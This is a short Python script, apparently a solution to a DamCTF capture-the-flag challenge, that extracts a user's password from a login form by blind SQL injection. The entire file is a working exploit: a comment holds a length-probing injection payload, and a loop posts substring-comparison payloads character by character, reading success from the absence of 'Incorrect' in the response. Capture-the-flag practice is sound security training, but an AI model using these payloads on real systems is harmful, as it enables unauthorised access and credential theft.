import requests

#length of pw: BobbySinclusto' and length(password)=11-- 

host = "https://bouncy-box.chals.damctf.xyz/login"


import random
import requests

Bobby_password=""

for i in range(0,12):
    for j in range(33,127):
        id_payload={'username_input': "BobbySinclusto' and substring(password,"+str(i)+",1)='"+chr(j)+"'-- ", 'password_input':'123'}
        r= requests.post(host,data=id_payload)
        
        text = r.text
        if text.find("Incorrect")==-1:
            Bobby_password+=chr(j)
            print(Bobby_password)
            break


    
